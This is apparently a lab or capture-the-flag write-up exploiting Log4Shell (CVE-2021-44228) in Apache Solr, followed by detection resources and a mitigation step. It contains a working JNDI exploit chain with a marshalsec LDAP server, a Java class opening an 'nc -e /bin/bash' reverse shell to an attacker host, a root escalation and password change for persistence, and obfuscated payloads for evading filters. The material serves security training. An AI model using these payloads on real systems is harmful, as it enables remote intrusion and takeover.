# Solar, exploiting log4j - Medium

1. [Introduction](#introduction)
2. [Reconnaissance](#reconnaissance)
3. [Discovery](#discovery)
4. [Proof of Concept](#proof-of-concept)
5. [Exploitation](#exploitation)
6. [Persistence](#persistence)
7. [Detection](#detection)
8. [Bypasses](#bypasses)
9. [Mitigation](#mitigation)

## Introduction

* CVE-2021-44228 (Log4Shell) affects the Java logging package ```log4j```; this vulnerability offers RCE.

## Reconnaissance

```shell
nmap -v -p- 10.10.124.206

nmap -A -p 8983 10.10.124.206
```

```markdown
1. What service is running on port 8983? - Apache Solr
```

## Discovery

* We can inspect the webpage on port 8983; it is the web interface for Apache Solr 8.11.0, running Java 1.8.0_181

* From the given task files, solr.log contains repeated INFO entries.

```markdown
1. What is the -Dsolr.log.dir argument set to, displayed on the front page? - /var/solr/logs

2. Which file includes contains this repeated entry? - solr.log

3. What "path" or URL endpoint is indicated in these repeated entries? - /admin/cores

4. Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? - params
```

## Proof of Concept

* We can access the page /solr/admin/cores (port 8983)

* log4j package parses the entries and can also act/evaluate code; this is exploited by CVE-2021-44228

* General payload to abuse log4j vulnerability:

    ```${jndi:ldap://ATTACKERIP}```

* We can enter this payload anywhere that has data logged by the app; we can supply 'params' to /solr/admin/cores

```shell
nc -nvlp 9999
#setup listener

curl 'http://10.10.124.206:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.154.43:9999\}'
#we receive connection at listener, but not reverse shell
```

## Exploitation

* Attack chain:

  * Payload helps in reaching out to attacker's LDAP referral server
  * LDAP referral server forwards request to a secondary attacker resource
  * The victim retrieves & executes code present in attacker resource

```shell
#we already have java8 setup
#we have marshalsec utility installed for ldap
#in Attackbox

cd /root/Rooms/solar/marshalsec

#we have maven installed
#build marshalsec utility
mvn clean package -DskipTests

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.154.43:8000/#Exploit"
#start LDAP server

#in new tab
vim Exploit.java
#add given payload code

javac Exploit.java -source 8 -target 8

ls
#we have Exploit.class

python3 -m http.server

#setup listener in another tab
nc -nvlp 9999

curl 'http://10.10.124.206:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.154.43:1389/Exploit\}'
#trigger exploit using JNDI syntax
#we get reverse shell at listener
```

```java
public class Exploit {    
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.154.43 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```markdown
1. What is the output of running this command? - Listening on 0.0.0.0:1389
```

## Persistence

```shell
whoami

python3 -c "import pty; pty.spawn('/bin/bash')"

sudo -l
#we can run all commands as all users

sudo bash

passwd solr
#new creds for solr
#grants persistence

#ssh in new tab
ssh solr@10.10.124.206
```

```markdown
1. What user are you? - solr
```

## Detection

* Resources to find apps vulnerable to 'Log4Shell':

  * [Log4Shell Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes)
  * [log4j class files hashes](https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d)
  * [Vulnerable jar and class hashes](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228)

## Bypasses

* Bypasses that can be used instead of JNDI payloads:

  * ```${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}```
  * ```${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}```
  * ```${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}```
  * ```${${::-j}ndi:rmi://attackerendpoint.com/}```

## Mitigation

```shell
#manually modify solr.in.sh
#to mitigate log4shell
locate solr.in.sh

sudo vim /etc/default/solr.in.sh
#add the following line at end of file
#SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"

sudo /etc/init.d/solr restart

#we can attempt to re-exploit apache solr
#the instance has been mitigated against log4shell this time
```

```markdown
1. What is the full path of the specific solr.in.sh file? - /etc/default/solr.in.sh
```
